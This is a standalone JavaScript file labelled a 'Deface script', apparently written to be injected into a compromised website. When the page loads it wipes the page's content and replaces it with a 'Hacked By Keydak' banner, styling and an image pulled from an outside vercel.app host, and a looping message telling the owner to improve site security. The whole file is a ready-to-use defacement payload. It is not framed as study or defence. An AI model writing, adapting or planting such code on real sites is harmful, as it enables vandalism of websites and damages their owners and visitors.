// Deface script
document.addEventListener('DOMContentLoaded', function () {

    document.documentElement.innerHTML = '';


    var newHtmlContent = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta http-equiv="X-UA-Compatible" content="IE=edge">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Home - Hacked By Keydak</title>
            <link rel="stylesheet" href="https://kepo-six.vercel.app/style.css">
        </head>
        <style>
           .mainContainer {
                    text-align: center;
                    padding-top: 50px;
                }

                .text-container {
                    display: inline-block;
                    overflow: hidden;
                    white-space: nowrap;
                    position: relative;
                    font-family: monospace;
                }

                .text1 {
                    display: inline-block;
                    overflow: hidden;
                    white-space: nowrap;
                    border-right: 3px solid;
                    animation: typing 4s steps(30, end), fadeOut 4s 2s forwards;
                }

                @keyframes typing {
                    from { width: 0 }
                    to { width: 100% }
                }

                @keyframes fadeOut {
                    from { opacity: 1; }
                    to { opacity: 0; }
                }
        </style>
        <body>
            <div class="mainContainer">
                <div class="img">
                    <img class="mainImage" src="https://kepo-six.vercel.app/jett.png" alt="image" style="width: 400px;">
                </div>
                <h1> Hacked By Keydak</h1>
                <hr class="hr">
                <div class="container">
                    <p class="text1"></p>
                </div>
            </div>
        </body>
              <script>
                             
                  function startTypingAnimation() {
                    var text = "you need to improve the security system on your site";
                    var textElement = document.querySelector('.text1');
                    var containerWidth = textElement.parentNode.offsetWidth;
                    var textWidth = textElement.offsetWidth;

                    // Calculate animation duration based on text width
                    var animationDuration = (textWidth / containerWidth) * 4000; // 4s for full width

                    // Apply animation duration to typing animation
                    textElement.style.animationDuration = animationDuration + 'ms';

                    // Start typing animation
                    textElement.classList.add('typing');
                }

                // Start typing animation when DOM content is loaded
                document.addEventListener('DOMContentLoaded', function () {
                    startTypingAnimation();

                    // After animation ends, restart typing animation
                    var textElement = document.querySelector('.text1');
                    textElement.addEventListener('animationend', function () {
                        textElement.classList.remove('typing');
                        setTimeout(function () {
                            textElement.classList.add('typing');
                        }, 2000); // 2s delay before restarting animation
                    });
                });
            </script>
        </html>
    `;


    // document.addEventListener('DOMContentLoaded', function() {
    //     var text = "you need to improve the security system on your site";
    //     var textElement = document.querySelector('.text1');
    //     var index = 0;

    //     function type() {
    //         if (index < text.length) {
    //             textElement.textContent += text.charAt(index);
    //             index++;
    //             setTimeout(type, 150);
    //         }
    //     }

    //     type();
    // });
   var fragment = document.createRange().createContextualFragment(newHtmlContent);
    document.body.appendChild(fragment);
});